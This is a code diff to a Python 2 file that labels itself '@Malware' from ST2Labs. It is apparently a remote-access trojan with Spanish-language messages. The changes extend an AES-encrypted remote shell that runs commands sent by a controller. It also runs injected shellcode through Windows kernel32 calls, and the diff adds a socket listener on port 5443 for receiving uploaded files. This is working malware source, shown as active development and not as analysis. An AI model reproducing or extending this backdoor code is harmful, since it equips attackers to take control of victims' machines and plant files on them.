@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 """
     @Malware
     ST2Labs / GEO SYSTEM SOFTWARE
@@ -146,20 +148,28 @@ def hack(code):
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 #Receive Data Method
-def receive(con, fileName):
+def receive(aes, fileName):
+    # Create a TCP/IP socket
+    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Bind the socket to the address given on the command line
+    server_address2 = ('', 5443)
+    sock2.bind(server_address2)
+    sock2.listen(5)
+    con2, client_address2 = sock2.accept()
+        
     f = open(fileName,'wb')
     print f
     #con.listen(5)                 # Now wait for client connection.
     print "Receiving..."
-    l = con.recv(1024)
-    while (l[:18] != 'File has been sent'):
+    l = con2.recv(1024)
+    while (l):
         print "Receiving..."
         f.write(l)
-        l = con.recv(1024)
+        l = con2.recv(1024)
     f.close()
-    print "Done Receiving"
-    print "Done Receiving"   
-    #con.close()                # Close the connection
+    con2.close()                # Close the connection
+    print "Done Receiving"  
 
 
 def shell(ip, port):
@@ -181,16 +191,14 @@ def shell(ip, port):
                 s.send(encoded)
                 break
             elif cmd == 'upload':
-                response = "Nombre del fichero, por favor"            
+                response = "¿Cual es el nombre que quiere que tenga en el destino (indique ext): "           
                 encoded = encodeCipher(aes, response)
                 s.send(encoded)
                 filename = decodeCipher(aes, s.recv(4096)) #Receive filename
                 print filename
                 encoded = encodeCipher(aes, 'OK')
                 s.send(encoded)
-                receive(s, filename)
-                encoded = encodeCipher(aes, 'Done Receiving')
-                s.send(encoded)
+                receive(aes, filename)
             elif cmd == "hack":
                 response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                 encoded = encodeCipher(aes, response)
@@ -208,7 +216,11 @@ def shell(ip, port):
                     s.send(encoded)
                     hack(cmd)
                     break
-            else:
+            elif cmd == 'ok':
+                response = "ok"        
+                encoded = encodeCipher(aes, response)
+                s.send(encoded)
+            else:  #Execute remote command
                 response = command(cmd)
                 # Here is where must implement action stuff
                 # response is result to exceute action
